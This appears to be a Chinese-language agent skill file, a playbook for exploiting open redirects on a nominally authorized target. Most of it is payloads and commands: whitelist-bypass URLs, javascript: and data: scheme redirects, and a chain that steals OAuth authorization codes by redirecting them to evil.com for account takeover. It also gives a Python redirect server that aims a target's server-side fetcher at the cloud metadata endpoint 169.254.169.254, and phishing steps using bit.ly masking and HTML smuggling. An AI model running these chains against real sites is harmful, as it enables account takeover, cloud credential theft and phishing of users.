---
name: 暗渡陈仓
description: >-
 开放重定向利用链：发现 redirect 参数、绕过验证（双斜杠/参数污染/协议混淆）、
 链接 OAuth state bypass、SSRF 升级、钓鱼结合、
 白名单域绕过技巧。
 OAuth 全链走 oauth2-password-grant-login-testing；SSRF 深挖走 ssrf-internal-pivoting。
version: 1.0.0
---

> **盗天**
> 自身本是轮回客，踏遍万里寻归途！
> 盗亦有道留一线，手到偷来不问途。

# 开放重定向利用链

**前提**：目标在 `授权范围`。开放重定向本身通常为 Medium；接 OAuth/账户接管才升级。

作业入口（先探针再读绕过节）：

```bash
python3 炼蛊房/open_redirect_surface_probe.py --base https://授权站 --case <案卷>
```

---

## §1 发现重定向参数

```bash
# 常见参数名
# url, redirect, next, return, returnTo, redirectTo, to, goto
# redirect_uri, callback, after, target, dest, destination
# continue, forward, r, ru, rurl

# Burp Suite → Proxy History → 过滤 302/301 响应
# 搜索 Location 头包含用户输入的响应

# 批量探测
for param in url redirect next return returnTo redirectTo to goto dest; do
 code=$(curl -so /dev/null -w "%{http_code}" "https://授权站/login?${param}=https://evil.com")
 echo "${param}=${code}"
done

# 关注前端 JS 中的跳转逻辑
curl -s "https://授权站/js/app.js" | grep -oE 'window\.location\.href\s*=|location\.replace\('
```

---

## §2 绕过白名单验证

### 双斜杠绕过

```bash
# 白名单：以 /target.com 开头时
# 绕过：//evil.com（浏览器解析为 https://evil.com）
https://授权站/redirect?url=//evil.com
https://授权站/redirect?url=\/\/evil.com
https://授权站/redirect?url=%2F%2Fevil.com

# 带白名单域（如需包含 target.com）
https://授权站/redirect?url=//evil.com@target.com
https://授权站/redirect?url=//target.com.evil.com
https://授权站/redirect?url=https://evil.com%23target.com
```

### 协议混淆

```bash
# javascript: 协议
https://授权站/redirect?url=javascript:alert(1)
https://授权站/redirect?url=JaVaScRiPt:alert(1)
https://授权站/redirect?url=%6aavascript:alert(1)

# 数据 URL
https://授权站/redirect?url=data:text/html,<script>alert(1)</script>

# 自定义协议
https://授权站/redirect?url=myapp://evil
```

### 参数污染

```bash
# 多个同名参数，服务端取第一个，浏览器跳转用最后一个
https://授权站/redirect?url=https://legit.com&url=https://evil.com

# 路径穿越
https://授权站/redirect?url=https://legit.com/../../../../../../evil.com

# Fragment 注入
https://授权站/redirect?url=https://legit.com#https://evil.com
```

### 白名单域前/后缀绕过

```bash
# 白名单：只检查包含 target.com
https://授权站/redirect?url=https://target.com.evil.com # 以 target.com 开头
https://授权站/redirect?url=https://evil-target.com # 包含 target
https://授权站/redirect?url=https://eviltarget.com.target.com # 后缀
https://授权站/redirect?url=https://target.com@evil.com # @ 分隔
```

---

## §3 Open Redirect → OAuth 状态绕过

**攻击场景**：OAuth 的 `redirect_uri` 验证仅检查域名，但同域内有开放重定向。

```bash
# 步骤：
# 1. 找到目标域内的开放重定向
# https://授权站/logout?next=https://evil.com

# 2. 构造 OAuth 请求，redirect_uri 指向开放重定向
https://oauth-provider.com/auth?
 client_id=APP_ID&
 response_type=code&
 redirect_uri=https://授权站/logout%3Fnext%3Dhttps://evil.com&
 scope=openid profile&
 state=STATE

# 3. 当用户授权时，OAuth code 跳转到：
# https://授权站/logout?next=https://evil.com&code=AUTH_CODE&state=STATE

# 4. 目标站执行跳转，将用户（和 code）带到 evil.com

# 5. evil.com 用 code 换取 access_token → 完整账户接管
```

---

## §4 Open Redirect → SSRF 升级

```bash
# 场景：服务端 fetch URL 时允许重定向
# URL 解析验证 → 通过 → fetch 跟随 301/302 → 到达内网

# 测试：令目标站的 URL fetcher 跟随重定向
# 在自控服务器上返回 302 到内网地址
python3 - << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
 def do_GET(self):
 self.send_response(302)
 self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
 self.end_headers()

HTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()
EOF

# 触发服务端 fetch
curl -s "https://授权站/api/fetch?url=http://YOUR_SERVER:8080/"
```

---

## §5 常见开放重定向漏洞场景

### 登录后跳转

```bash
# 最常见：认证成功后跳转
https://授权站/login?redirect=https://evil.com
https://授权站/login?next=//evil.com
https://授权站/auth?returnUrl=//evil.com

# 测试：带不同参数登录，看 302 响应的 Location
curl -si -X POST "https://授权站/api/login" \
 -d 'username=test&password=test&next=https://evil.com' \
 | grep -i location
```

### 退出后跳转

```bash
https://授权站/logout?redirect=https://evil.com
https://授权站/signout?url=//evil.com

# 结合 CSRF：诱导受害者退出并重定向到钓鱼页
```

### 邮箱确认/密码重置

```bash
# 点击邮件中链接后跳转
https://授权站/verify?token=xxx&redirect=https://evil.com

# 利用：截获合法邮件，将 redirect 改为钓鱼
```

### 第三方链接代理

```bash
# 外链代理（防盗链或安全跳转）
https://授权站/go?url=https://evil.com
https://授权站/exit?target=https://evil.com
https://授权站/outbound?link=https://evil.com
```

---

## §6 与钓鱼结合

```bash
# 构造可信链接（目标域名开头）
https://授权站/redirect?url=https://evil-phishing-site.com

# 结合 Bit.ly 短链掩盖 evil domain
bit.ly/trusted → https://授权站/redirect?url=https://evil.com/login.html

# 结合 HTML 走私（避免 URL 扫描）
<a href="https://授权站/redirect?url=https%3A%2F%2Fevil.com">Click here</a>
```

---

## §7 批量发现工具

```bash
# gf（grep-friendly）open-redirect 模式
go install github.com/tomnomnom/gf@latest
echo "https://授权站/login?next=test" | gf redirect

# nuclei 模板
nuclei -u "https://授权站" -tags redirect,open-redirect

# dalfox（XSS 中也检测 OR）
dalfox url "https://授权站/login?next=test" --only-discovery

# Burp Scanner → Active Scan → Open Redirection
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | 发现外部重定向（302 + Location 可控） |
| L2 | 白名单绕过成功 / 结合 OAuth 或钓鱼 |
| L3 | 账户接管（OAuth code 截获）/ SSRF 内网访问 |

---

## 真源

- 手法：`传承/暗渡陈仓.md`
- 工具：`python3 炼蛊房/open_redirect_surface_probe.py --help`
